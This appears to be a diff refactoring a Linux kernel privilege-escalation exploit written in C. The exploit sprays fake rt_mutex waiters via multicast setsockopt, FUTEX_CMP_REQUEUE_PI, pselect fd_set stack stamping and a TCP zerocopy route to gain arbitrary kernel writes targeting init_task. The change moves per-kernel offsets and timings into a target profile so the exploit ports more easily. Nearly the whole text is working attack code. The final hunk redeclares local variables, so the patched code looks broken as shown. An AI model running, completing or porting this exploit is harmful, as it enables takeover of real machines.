@@ -11,6 +11,9 @@
 static double fops_elapsed_ms(struct timespec *ref) {
   return runtime_elapsed_ms(ref);
 }
+static const struct execution_settings *execution_settings(void) {
+  return target_profile_execution(&g_target_profile);
+}
 int route_last_step;
 int route_last_errno;
 
@@ -41,13 +44,15 @@ static long mr_adjust(void) {
  * profile, target, value, lock, task and socket; output: submission status.
  * Future: multicast_waiter_stamp(context, request), returning structured error. */
 static void mr_stamp(uintptr_t target, uintptr_t value, uintptr_t lock) {
-  size_t size = active_offsets->mcast_buffer_size;
+  MulticastWaiterLayout layout =
+      target_profile_multicast_waiter_layout(&g_target_profile);
+  size_t size = layout.buffer_size;
   unsigned char b[size];
-  size_t o = active_offsets->mcast_waiter_off;
+  size_t o = layout.waiter_offset;
   memset(b, 0, sizeof(b));
   if (target) { put64(b, o, (target - 8) & ~(uintptr_t)3); put64(b, o + 8, value); }
-  put64(b, o + active_offsets->mcast_task_offset, mr_task);
-  put64(b, o + active_offsets->mcast_lock_offset, lock);
+  put64(b, o + layout.task_offset, mr_task);
+  put64(b, o + layout.lock_offset, lock);
   uint16_t family = AF_UNSPEC; memcpy(b + 8, &family, sizeof(family));
   setsockopt(mr_fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, b, sizeof(b));
 }
@@ -68,9 +73,10 @@ static void *mr_y(void *arg) {
   mr_stamp(0, 0, mr_lock); atomic_store(&mr_y_done, 1);
   while (!atomic_load(&mr_stop)) {
     if (atomic_exchange(&mr_respray, 0)) {
-      uintptr_t lock = mr_lock + active_offsets->mcast_lock_slots_offset +
-          (mr_lock_slot++ % active_offsets->mcast_lock_slot_count) *
-              active_offsets->mcast_lock_slot_stride;
+      MulticastWaiterLayout layout =
+          target_profile_multicast_waiter_layout(&g_target_profile);
+      uintptr_t lock = mr_lock + layout.lock_slots_offset +
+          (mr_lock_slot++ % layout.lock_slot_count) * layout.lock_slot_stride;
       mr_stamp(mr_target, mr_value, lock); atomic_store(&mr_sprayed, 1);
     }
     sched_yield();
@@ -100,9 +106,13 @@ static void *mr_x(void *arg) {
  * profile comments rather than the symbol name. */
 int kernel5_resident_start(void) {
   if (mr_ready) return 1;
-  uintptr_t bss = data_addr(KIMAGE_TEXT_BASE + active_offsets->off_mcast_fake_bss);
-  mr_lock = bss + active_offsets->mcast_fake_lock_offset;
-  mr_task = bss + active_offsets->mcast_fake_task_offset;
+  MulticastWaiterLayout layout =
+      target_profile_multicast_waiter_layout(&g_target_profile);
+  const struct execution_settings *execution = execution_settings();
+  uintptr_t bss = resolved_addresses_data_alias(
+      &g_resolved_addresses, KIMAGE_TEXT_BASE + layout.fake_bss_image_offset);
+  mr_lock = bss + layout.fake_lock_offset;
+  mr_task = bss + layout.fake_task_offset;
   mr_l1=mr_l2=mr_cond=0; mr_policy=SCHED_NORMAL; mr_lock_slot=0;
   atomic_store(&mr_y_l2,0); atomic_store(&mr_x_l1,0); atomic_store(&mr_y_wait,0);
   atomic_store(&mr_x_wait,0); atomic_store(&mr_y_done,0); atomic_store(&mr_stop,0);
@@ -110,14 +120,24 @@ int kernel5_resident_start(void) {
   struct sigaction sa={0}; sa.sa_handler=mr_intr; sigemptyset(&sa.sa_mask);
   if (sigaction(SIGUSR1,&sa,NULL) || pthread_create(&mr_ty,NULL,mr_y,NULL) ||
       pthread_create(&mr_tx,NULL,mr_x,NULL)) return 0;
-  while (!(atomic_load(&mr_y_l2)&&atomic_load(&mr_x_l1)&&atomic_load(&mr_y_wait)&&atomic_load(&mr_x_wait))) sched_yield();
-  usleep(200000); errno=0;
+  struct timespec ready_started;
+  clock_gettime(CLOCK_MONOTONIC, &ready_started);
+  while (!(atomic_load(&mr_y_l2)&&atomic_load(&mr_x_l1)&&
+           atomic_load(&mr_y_wait)&&atomic_load(&mr_x_wait))) {
+    if (fops_elapsed_ms(&ready_started) >= execution->multicast_ready_timeout_ms)
+      return 0;
+    sched_yield();
+  }
+  usleep(execution->multicast_post_requeue_settle_us); errno=0;
   long r=futex_op(&mr_cond,FUTEX_CMP_REQUEUE_PI_PRIVATE,1,(void*)0,&mr_l1,0);
   mr_cond=1; syscall(SYS_tgkill,getpid(),atomic_load(&mr_y_tid),SIGUSR1);
   if (r>=0 || (errno!=EDEADLK && errno!=EDEADLOCK)) return 0;
-  for(int i=0;i<10000000&&!atomic_load(&mr_y_done);i++) sched_yield();
+  clock_gettime(CLOCK_MONOTONIC, &ready_started);
+  while (!atomic_load(&mr_y_done) &&
+         fops_elapsed_ms(&ready_started) < execution->multicast_ready_timeout_ms)
+    sched_yield();
   if(!atomic_load(&mr_y_done) || mr_adjust()<0) return 0;
-  usleep(100000); mr_ready=1;
+  usleep(execution->multicast_post_adjust_settle_us); mr_ready=1;
   pr_success("5.x resident writer ready bss=0x%zx lock=0x%zx task=0x%zx\n",bss,mr_lock,mr_task);
   return 1;
 }
@@ -146,17 +166,18 @@ void kernel5_resident_stop(void) {
  * multicast_waiter_execute(); route_last_* becomes the returned status. */
 void do_kernel5_fake_lock_route(const WriteRequest *request) {
   (void)request;
-  size_t stamp_size = active_offsets->mcast_buffer_size;
-  size_t waiter_off = (size_t)active_offsets->mcast_waiter_off;
+  MulticastWaiterLayout layout =
+      target_profile_multicast_waiter_layout(&g_target_profile);
+  size_t stamp_size = layout.buffer_size;
+  size_t waiter_off = layout.waiter_offset;
   unsigned char stamp[stamp_size];
   memset(stamp, 0, sizeof(stamp));
-  // TODO(decoupling:S13-multicast-profile): Future:
-  // build_multicast_waiter_payload() receives MulticastWaiterLayout.
-  // Input: immutable route layout; output: encoded stamp bytes.
-  // Blocked by: route profile/context migration; completion removes this TODO.
   build_multicast_waiter_payload(
-      stamp, waiter_off, active_offsets->mcast_task_offset,
-      active_offsets->mcast_lock_offset, fake_task, fake_lock);
+      stamp, waiter_off, layout.task_offset,
+      layout.lock_offset, fake_task, fake_lock);
+  // TODO(decoupling:S13-multicast-context): Future: encoder input comes from
+  // MulticastWaiterRouteContext. Input: route-owned layout/payload; output:
+  // stamp bytes. Blocked by: route ownership migration in S13.
   uint16_t family = AF_UNSPEC;
   memcpy(stamp + 8, &family, sizeof(family));
 
@@ -182,12 +203,6 @@ void do_kernel5_fake_lock_route(const WriteRequest *request) {
  * zc words overlap the stale waiter; zc[0x28] is waiter->task, zc[0x30]
  * waiter->lock. */
 #define TCP_PUNCH_SHMEM_LEN (16 * 1024 * 1024)
-/* caps a route that never wins so a lost run does not spend the app timeout */
-#define TCP_ROUTE_ATTEMPTS 128
-#define TCP_ARM_SEQ 16
-#define TCP_POST_GETSOCKOPT_HOLD 20000
-/* compact pselect retry */
-#define PSELECT_CFI_ROUTE_ATTEMPTS 4
 
 struct tcp_punch_state {
   int fd;
@@ -320,6 +335,7 @@ void do_tcp_fake_lock_route(const WriteRequest *request) {
   pthread_t puncher;
   int puncher_started = 0;
   int route_ok = 0;
+  const struct execution_settings *execution = execution_settings();
 
   if (tcp_make_pair(&client_fd, &server_fd) != 0) {
     route_last_step = 41;
@@ -368,13 +384,14 @@ void do_tcp_fake_lock_route(const WriteRequest *request) {
 
   /* waiter->task carries init_task's phys alias, not the image address */
   uintptr_t waiter_task = SLIDE_INIT_TASK;
-  int arm_seq = TCP_ARM_SEQ;
-  int post_hold = TCP_POST_GETSOCKOPT_HOLD;
+  int arm_seq = (int)execution->tcp_arm_sequence;
+  int post_hold = (int)execution->tcp_post_receive_hold_iterations;
+  int attempts = (int)execution->tcp_attempts;
 
   pr_info("tcp route enter page=%016zx fake_lock=%016zx fake_w0=%016zx "
           "fake_task=%016zx task=%016zx attempts=%d arm=%d hold=%d\n",
           page_base, fake_lock, fake_w0, fake_task, waiter_task,
-          TCP_ROUTE_ATTEMPTS, arm_seq, post_hold);
+          attempts, arm_seq, post_hold);
 
   atomic_store(&tcp_punch_go, 1);
   /* custom-write mode: fire the PI walk immediately */
@@ -383,7 +400,7 @@ void do_tcp_fake_lock_route(const WriteRequest *request) {
   char sendbuf[64];
   memset(sendbuf, 0x33, sizeof(sendbuf));
 
-  for (int i = 1; i <= TCP_ROUTE_ATTEMPTS && !route_ok; i++) {
+  for (int i = 1; i <= attempts && !route_ok; i++) {
     int calls_before = atomic_load(&consumer_calls);
     int success_before = atomic_load(&consumer_success);
     (void)send(server_fd, sendbuf, sizeof(sendbuf), MSG_DONTWAIT);
@@ -476,39 +493,10 @@ out:
  * immutable profile; output: microseconds. Future:
  * select_stack_delay_usec(const TargetProfile *, int). */
 static int route_delay_usec(int attempt) {
-  if (!(active_offsets && active_offsets->compact_waiter)) {
-    (void)attempt;
-    /* let select set up its stack frame before the PI walk */
-    return PSELECT_ENTER_DELAY_USEC;
-  }
-  const char *forced = getenv("PSELECT_DELAY_USEC");
-  if (forced && *forced) {
-    char *end = NULL;
-    long value = strtol(forced, &end, 0);
-    if (end != forced && !*end && value >= 0 && value <= 2000000) {
-      return (int)value;
-    }
-  }
-  static const int delays[] = {
-    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
-  };
-  return delays[(attempt - 1) % 8];
-}
-
-static void compact_timeout_values(long *sec, long *usec) {
-  *sec = 1;
-  *usec = 0;
-  const char *s = getenv("PSELECT_TIMEOUT_OVERRIDE_USEC");
-  if (!s || !*s) {
-    return;
-  }
-  char *end = NULL;
-  errno = 0;
-  long value = strtol(s, &end, 0);
-  if (!errno && end != s && !*end && value >= 0) {
-    *sec = value / 1000000;
-    *usec = value % 1000000;
-  }
+  (void)attempt;
+  /* Both routes: let select/pselect establish its frame and stamp the
+   * crafted waiter before the PI walk fires. */
+  return (int)execution_settings()->select_enter_delay_us;
 }
 
 void fdset_put_word(fd_set *set, int word, uint64_t value) {
@@ -553,8 +541,14 @@ static int pselect_put_global_word(
 /* Decoupling plan: read the select-stack waiter layout. Input: profile; output:
  * word shift. Future: select_stack_waiter_shift(const TargetProfile *). */
 static int pselect_waiter_shift(void) {
-  return active_offsets ? active_offsets->pselect_waiter_shift
-                        : PSELECT_WAITER_WORD_SHIFT;
+  SelectStackLayout layout =
+      target_profile_select_stack_layout(&g_target_profile);
+  // TODO(decoupling:S12-select-context): Future: this layout is owned by
+  // SelectStackRouteContext. Input: route context/request; output: fd_sets.
+  // Blocked by: route ownership migration in S12.
+  return target_profile_is_loaded(&g_target_profile)
+             ? layout.waiter_shift
+             : PSELECT_WAITER_WORD_SHIFT;
 }
 
 /* Decoupling plan: encode a logical waiter word across select fd_sets. Inputs:
@@ -633,11 +627,9 @@ void prepare_pselect_fdsets(
   FD_ZERO(ex);
 
   int words_per_set = pselect_words_per_set();
-  // TODO(decoupling:S12-select-profile): Future:
-  // select_stack_build_fdsets() receives SelectStackLayout.
-  // Input: immutable layout/request; output: three encoded fd_sets.
-  // Blocked by: select route context migration; completion removes this TODO.
-  int compact = active_offsets && active_offsets->compact_waiter;
+  SelectStackLayout layout =
+      target_profile_select_stack_layout(&g_target_profile);
+  int compact = layout.compact_waiter;
 
   struct pselect_waiter_word {
     int word;
@@ -709,10 +701,15 @@ void do_pselect_fake_lock_route(const WriteRequest *request) {
 
   struct timespec route_t0;
   clock_gettime(CLOCK_MONOTONIC, &route_t0);
+  int calls = 0;
+  int success = 0;
+  const struct execution_settings *execution = execution_settings();
   int pipefd[2];
   SYSCHK(pipe(pipefd));
 
-  int compact_route = active_offsets && active_offsets->compact_waiter;
+  SelectStackLayout layout =
+      target_profile_select_stack_layout(&g_target_profile);
+  int compact_route = layout.compact_waiter;
 
   /* Both routes park on a never-ready timerfd: the waiter must stay stale
    * on the pselect stack for the whole consumer window. */
@@ -770,7 +767,20 @@ void do_pselect_fake_lock_route(const WriteRequest *request) {
   errno = 0;
   int ret;
   if (compact_route) {
-    compact_timeout_values(&compact_timeout_sec, &compact_timeout_usec);
+    uint32_t timeout_us = execution->select_timeout_us;
+    struct timespec ts = {
+      .tv_sec = timeout_us / 1000000,
+      .tv_nsec = (long)(timeout_us % 1000000) * 1000,
+    };
+    ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &ts, NULL);
+  } else {
+    /* 6.6: select() with a {0, 200ms} timeout. */
+    uint32_t timeout_us = execution->select_timeout_us;
+    struct timeval timeout = {
+      .tv_sec = timeout_us / 1000000,
+      .tv_usec = timeout_us % 1000000,
+    };
+    ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
   }
 
   int calls = 0;
